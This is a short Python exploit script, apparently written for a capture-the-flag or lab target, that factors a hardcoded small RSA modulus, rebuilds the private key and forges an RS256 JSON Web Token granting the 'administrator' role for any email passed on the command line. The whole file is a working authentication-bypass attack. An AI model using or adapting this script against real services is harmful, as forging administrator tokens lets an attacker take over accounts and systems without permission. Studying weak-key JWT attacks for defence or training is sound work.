import sys
import time
import sympy
import base64
import jwt
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from colorama import Fore, Style

def factorize(n, e):
	factors = sympy.factorint(n)
	p, q = list(factors.keys())

	phi_n = (p-1) * (q-1)
	d = pow(e, -1, phi_n)

	print(Fore.GREEN + f"[+] Coprime pairs recovered!")
	print(f"[+] p: {p}")
	print(f"[+] q: {q}")
	print(Style.RESET_ALL)

	return (p, q, d)

def gen_key(p, q, d, n, e):
	phi_n = (p-1) * (q-1)
	key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
	key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
	private_key_bytes = key.export_key()

	private_key = serialization.load_pem_private_key(
		private_key_bytes,
		password=None,
		backend=default_backend()
	)
	public_key = private_key.public_key()

	return (private_key, public_key)

def gen_jwt(data, private_key):
	token = jwt.encode(data, private_key, algorithm="RS256")

	print(Fore.GREEN + f"[+] Administrative JWT generated:" + Style.RESET_ALL)
	print(token)
	return token

def main():
	if len(sys.argv) != 2:
		print(Fore.RED + f"[-] Usage: {sys.argv[0]} <email>")
		exit(0)

	n = 67021216477050423618004276652930908901044415019295637947989671772908373626300944063046292896198650928220835225288935470244648956006733836569377627614504804073763129224690307534422678940037120346949817436020381009210627836968523857326898122166220781244833392589852610070454732313153893008380541039030976978810158079
	e = 65537
	email = sys.argv[1]
	iat = int(time.time())
	exp = iat+3600

	(p, q, d) = factorize(n, e)
	(private_key, public_key) = gen_key(p, q, d, n, e)

	data = {
		"email": email,
		"role": "administrator",
		"iat": iat,
		"exp": exp,
		"jwk": {
			"kty": "RSA",
			"n": n,
			"e": e
		}
	}

	token = gen_jwt(data, private_key)

if __name__ == "__main__":
	main()